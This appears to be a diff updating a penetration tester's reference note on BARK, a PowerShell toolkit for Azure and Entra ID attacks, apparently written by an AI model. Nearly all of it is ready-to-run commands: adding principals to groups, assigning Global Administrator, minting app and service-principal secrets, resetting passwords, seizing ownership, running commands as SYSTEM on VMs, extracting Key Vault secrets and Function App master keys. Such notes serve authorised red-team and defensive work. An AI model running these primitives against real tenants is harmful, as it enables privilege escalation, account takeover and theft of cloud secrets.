@@ -5,16 +5,18 @@
 BloodHound Attack Research Kit — PowerShell library for executing Azure AD / Entra ID attack primitives. Not an enumeration tool; it's a targeted execution tool. Each function performs one specific abuse (add member to group, grant app role, reset password, add secret to SP, etc.) that directly maps to BloodHound Azure attack edges. Use after BloodHound / roadrecon has identified a path.
 
 **Source:** https://github.com/BloodHoundAD/BARK
-**AzureHound (data collector):** https://github.com/BloodHoundAD/AzureHound
+**AzureHound (data collector):** https://github.com/SpecterOps/AzureHound (moved from BloodHoundAD)
 **Install:**
 ```powershell
 git clone https://github.com/BloodHoundAD/BARK
 . .\BARK.ps1
 ```
 
-> [!note] **BARK workflow** — Collect with AzureHound → import into BloodHound → identify attack path → execute each hop with the matching BARK primitive. BARK functions map 1:1 to BloodHound Azure edges (AZAddMember, AZGrantAppRoles, AZResetPassword, AZOwns, etc.).
+> [!note] **BARK workflow** — Collect with AzureHound → import into BloodHound → identify attack path → execute each hop with the matching BARK primitive. BARK functions map to BloodHound Azure edges.
 
-> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Service Principal & App Registration Abuse section.
+> [!warning] **BARK was renamed — the old `Invoke-AZ*` / `Get-AZ*` names are gone.** Current BARK uses **`*-Entra*`** for the direct actions (`Add-MemberToEntraGroup`, `New-EntraRoleAssignment`, `New-EntraAppSecret`, `Set-EntraUserPassword`, `New-EntraAppOwner`…), **`Get-All*` / `Get-Entra*`** for recon, **`*-AzureRM*`** for Azure resource attacks, and **`Test-MG*` / `Test-AzureRM*`** for the edge-abuse *validation* primitives (usually driven by the `Invoke-All*AbuseTests` runners, not by hand). Anything below reflects the current module — verify with `Get-Command -Module BARK` or `Get-ChildItem function:\*Entra*`.
+
+> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Service Principal & App Registration Abuse section; collect the graph with [[Tools/Cloud/AzureHound|AzureHound]], analyse in [[Tools/AD/BloodHound|BloodHound]].
 
 ---
 
@@ -54,40 +56,37 @@ $token = Get-MSGraphTokenWithClientCredentials `
 # From refresh token
 $token = Get-MSGraphTokenWithRefreshToken -RefreshToken <rt> -TenantID <tid>
 
-# Test token is valid
-Test-MGToken -Token $token
+# For Azure Resource Manager (ARM) attacks you need an ARM-audience token instead:
+$armToken = Get-AzureRMTokenWithRefreshToken -RefreshToken <rt> -TenantID <tid>
+
+# Inspect a token's claims (scp/roles/aud) — there is no Test-MGToken; decode instead
+Parse-JWTToken -Token $token
 ```
 
 ---
 
-## Group Manipulation (AZAddMember)
+## Group Manipulation (AZAddMember edge)
 
 ```powershell
-# Add user to group
-Invoke-AZAddGroupMember `
+# Add a principal to a group
+Add-MemberToEntraGroup `
   -TargetGroupId "<group-object-id>" `
-  -PrincipalId "<user-object-id>" `
-  -Token $token
-
-# Remove member
-Invoke-AZRemoveGroupMember `
-  -TargetGroupId "<group-object-id>" `
-  -PrincipalId "<user-object-id>" `
+  -PrincipalID "<user-object-id>" `
   -Token $token
 
 # Get group members
-Get-AZGroupMembers -GroupID "<group-object-id>" -Token $token
+Get-EntraGroupMembers -GroupID "<group-object-id>" -Token $token
 ```
 
 ---
 
-## Role Assignments (AZGrantRole)
+## Role Assignments (AZHasRole / AZAddSelfToRole edge)
 
 ```powershell
-# Assign a directory role to a user
-Invoke-AZGrantRole `
-  -PrincipalId "<user-object-id>" `
-  -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `  # Global Administrator
+# Assign a directory role to a principal
+New-EntraRoleAssignment `
+  -PrincipalID "<user-object-id>" `
+  -RoleDefinitionID "62e90394-69f5-4237-9190-012177145e10" `  # Global Administrator
   -Token $token
 ```
 
@@ -103,33 +102,35 @@ Invoke-AZGrantRole `
 
 ---
 
-## App & SP Secret Abuse (AZAddSecret)
+## App & SP Secret Abuse (AZAddSecret edge)
 
 ```powershell
-# Add secret to an app registration (requires Application.ReadWrite.All or app ownership)
-Invoke-AZAddSecretToApp `
-  -AppObjectId "<app-object-id>" `
+# Add a secret/password to an app registration (needs Application.ReadWrite.All or app ownership)
+New-EntraAppSecret `
+  -AppRegObjectID "<app-registration-object-id>" `
   -Token $token
-# Returns new client secret — use with app's client ID to auth as that application
+# Returns a new client secret — use it with the app's client ID to auth AS that application
 
-# Add secret to a service principal
-Invoke-AZAddSecretToSP `
-  -SPObjectId "<sp-object-id>" `
+# Add a secret to a service principal
+New-EntraServicePrincipalSecret `
+  -ServicePrincipalID "<sp-object-id>" `
   -Token $token
 ```
 
 ---
 
-## App Role Grants (AZGrantAppRoles)
+## App Role Grants (AZMGGrantAppRoles edge)
 
 ```powershell
-# Grant MS Graph app role to a service principal (requires AppRoleAssignment.ReadWrite.All)
+# Grant an MS Graph app role to a service principal (needs AppRoleAssignment.ReadWrite.All)
 # E.g. grant RoleManagement.ReadWrite.Directory for full role control
-Invoke-AZGrantAppRoles `
-  -SPObjectId "<service-principal-object-id>" `
-  -AppRoleId "<app-role-id>" `
-  -ResourceSPObjectId "<ms-graph-sp-object-id>" `
+New-EntraAppRoleAssignment `
+  -SPObjectID "<service-principal-object-id>" `
+  -AppRoleID "<app-role-id>" `
+  -ResourceID "<ms-graph-sp-object-id>" `
   -Token $token
+# List assignable MS Graph app roles first:
+Get-MGAppRoles -Token $token
 ```
 
 **Useful MS Graph app role IDs:**
@@ -142,39 +143,40 @@ Invoke-AZGrantAppRoles `
 
 ---
 
-## Password Reset (AZResetPassword)
+## Password Reset (AZResetPassword edge)
 
 ```powershell
-# Reset a user's password (requires Authentication Administrator or higher)
-Invoke-AZResetUserPassword `
+# Reset a user's password (needs Authentication Administrator or higher)
+Set-EntraUserPassword `
   -TargetUserID "<user-object-id>" `
-  -NewPassword "P@ssw0rd123!" `
+  -Password "P@ssw0rd123!" `
   -Token $token
+# Reset-EntraUserPassword also exists as an alternate.
 ```
 
 ---
 
-## Ownership Abuse (AZOwns)
+## Ownership Abuse (AZOwns edge)
 
-If your account owns an app/SP/group, you can escalate through it.
+If your account owns (or can add itself as owner of) an app/SP/group, you can escalate through it.
 
 ```powershell
-# Add yourself as owner of an app registration
-Invoke-AZAddOwnerToApp `
-  -AppObjectId "<app-object-id>" `
-  -PrincipalId "<your-user-object-id>" `
+# Add an owner to an app registration
+New-EntraAppOwner `
+  -AppObjectID "<app-object-id>" `
+  -NewOwnerObjectID "<your-user-object-id>" `
   -Token $token
 
-# Add yourself as owner of a service principal
-Invoke-AZAddOwnerToSP `
-  -SPObjectId "<sp-object-id>" `
-  -PrincipalId "<your-user-object-id>" `
+# Add an owner to a service principal
+New-EntraServicePrincipalOwner `
+  -ServicePrincipalObjectID "<sp-object-id>" `
+  -NewOwnerObjectID "<your-user-object-id>" `
   -Token $token
 
-# Add yourself as owner of a group
-Invoke-AZAddOwnerToGroup `
-  -GroupObjectId "<group-object-id>" `
-  -PrincipalId "<your-user-object-id>" `
+# Add an owner to a group
+New-EntraGroupOwner `
+  -GroupObjectID "<group-object-id>" `
+  -NewOwnerObjectID "<your-user-object-id>" `
   -Token $token
 ```
 
@@ -183,22 +185,62 @@ Invoke-AZAddOwnerToGroup `
 ## Recon
 
 ```powershell
-# Global Admins
-Get-AZGlobalAdminRoleMembers -Token $token
+# Bulk directory objects
+Get-AllEntraUsers            -Token $token
+Get-AllEntraGroups           -Token $token
+Get-AllEntraApps             -Token $token
+Get-AllEntraServicePrincipals -Token $token
+Get-AllEntraRoles            -Token $token
 
-# Members of any role
-Get-AZRoleMembers -RoleDefinitionId "<role-id>" -Token $token
+# Owners of a specific app / SP / group
+Get-EntraAppOwner              -AppObjectID "<app-object-id>" -Token $token
+Get-EntraServicePrincipalOwner -ServicePrincipalObjectId "<sp-object-id>" -Token $token
+Get-EntraGroupOwner            -GroupObjectID "<group-object-id>" -Token $token
 
-# App registrations + owners
-Get-AZApplications -Token $token
-Get-AZApplicationOwners -AppObjectId "<app-id>" -Token $token
+# Highest-value targets: SPs that hold Tier Zero MS Graph app roles (DA-equivalent in the cloud)
+Get-EntraTierZeroServicePrincipals -Token $token
+```
 
-# Service principals
-Get-AZServicePrincipals -Token $token
+---
+
+## Azure Resource Manager (ARM) Abuse
+
+BARK also attacks Azure *resources* (needs an ARM-audience token — `Get-AzureRMTokenWith*`). These are the highest-impact primitives: command exec on VMs, secret theft from Key Vaults, Function App keys.
+
+```powershell
+# Enumerate what you can reach (VM/KeyVault enum take -SubscriptionID from the sub list)
+Get-AllAzureRMSubscriptions   -Token $armToken
+Get-AllAzureRMVirtualMachines -Token $armToken -SubscriptionID "<sub-id>"
+Get-AllAzureRMKeyVaults       -Token $armToken -SubscriptionID "<sub-id>"
+
+# Run a command as SYSTEM/root on a VM (Microsoft.Compute/.../runCommand)
+Invoke-AzureRMVMRunCommand `
+  -TargetVMId "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Compute/virtualMachines/<vm>" `
+  -Script "whoami" `
+  -Token $armToken
+
+# Pull a Key Vault secret value
+Get-AzureRMKeyVaultSecretValue -KeyVaultSecretID "https://<vault>.vault.azure.net/secrets/<name>" -Token $keyVaultToken
+
+# Function App master keys → invoke/backdoor functions
+Get-AzureFunctionAppMasterKeys -Token $armToken -PathToFunctionApp "<function-app-resource-id>"
+```
+
+---
+
+## "What can I actually abuse?" — abuse-test runners
+
+BARK's `Test-MG*` / `Test-AzureRM*` primitives validate each BloodHound edge against a token. Rather than call them individually (they expect a Global-Admin comparison token), run the suite:
+
+```powershell
+# Run every MS Graph / Entra abuse test with your token and report what succeeds
+Invoke-AllEntraAbuseTests   -GlobalAdminClientID <ga-app-id> -GlobalAdminSecret <secret> -TenantName company.onmicrosoft.com
+Invoke-AllAzureRMAbuseTests -Token $armToken
+Invoke-AllAzureMGAbuseTests -Token $token
 ```
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
